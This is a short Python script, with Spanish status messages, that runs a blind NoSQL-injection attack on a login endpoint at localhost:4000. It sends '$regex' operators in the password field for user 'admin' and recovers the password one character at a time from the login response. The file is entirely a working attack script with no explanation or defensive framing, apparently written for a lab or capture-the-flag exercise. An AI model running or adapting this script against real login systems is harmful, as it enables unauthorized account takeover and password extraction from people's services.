import requests, time, sys, signal, string

login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLi():
    password = ""
    
    print("[+] Iniciando proceso de fuerza bruta")
    
    time.sleep(2)
    
    print("[+] Buscando password...")
    for position in range(0, 24):
        for character in characters:
            post_data = '{"username": "admin", "password":{"$regex":"^%s%s"}}' % (password, character)
            
            print(f"[*] Probando: {post_data}")
            
            headers = {'Content-Type': 'application/json'}
            
            r = requests.post(login_url, headers=headers, data=post_data)
            
            if "Logged in as user" in r.text:
                password += character
                print(f"[+] Password encontrado hasta ahora: {password}")
                break
                
if __name__ == '__main__':
    makeNoSQLi()
